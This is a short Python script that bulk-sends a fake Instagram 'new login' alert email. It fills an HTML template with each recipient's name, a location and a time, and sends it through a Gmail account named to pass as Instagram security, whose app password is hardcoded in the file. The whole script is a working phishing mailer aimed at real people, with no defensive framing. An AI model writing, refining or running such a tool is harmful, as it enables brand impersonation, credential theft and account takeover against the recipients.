import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from datetime import datetime
import requests

def get_location():
    try:
        response = requests.get("http://ipinfo.io/json")
        data = response.json()
        city = data.get("city", "")
        region = data.get("region", "")
        country = data.get("country", "")
        print(f"Location: {city}, {region}, {country}")
        return f"{city}, {region}, {country}"
    except:
        return "Unknown Location"

def get_current_time():
    return datetime.now().strftime("%B %d at %I:%M %p")

def send_html_email(sender_email, app_password, receiver_email, subject, html_file):
    with open(html_file, 'r', encoding='utf-8') as f:
        html_content = f.read()

    username = receiver_email.split("@")[0]
    parts = username.replace(".", " ").replace("_", " ").split()
    first_name = parts[0].capitalize() if len(parts) > 0 else "User"
    last_name = parts[1].capitalize() if len(parts) > 1 else ""

    html_content = html_content.replace("{{email}}", receiver_email)
    html_content = html_content.replace("{{first_name}}", first_name)
    html_content = html_content.replace("{{location}}", get_location())
    html_content = html_content.replace("{{time}}", get_current_time())

    msg = MIMEMultipart("alternative")
    msg["Subject"] = subject
    msg["From"] = sender_email
    msg["To"] = receiver_email
    html_part = MIMEText(html_content, "html")
    msg.attach(html_part)

    with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:
        server.login(sender_email, app_password)
        server.sendmail(sender_email, receiver_email, msg.as_string())

    print(f"[✓] Email sent successfully to {receiver_email}")

if __name__ == "__main__":
    sender = "insta.gram.secure.che.ck.alertt@gmail.com"
    password = "bvpaplwexxlqszwh"
    
    try:
        with open(r'emails.txt', 'r', encoding='utf-8') as f:

            emails = [line.strip() for line in f if line.strip()]

        for receiver in emails:
            send_html_email(
                sender_email=sender,
                app_password=password,
                receiver_email=receiver,
                subject="New login to Instagram from Mobile Safari on Apple iPhone",
                html_file=r"email.html"
            )
    except FileNotFoundError:
        print("[!] File 'emails.txt' not found. Please make sure it exists.")
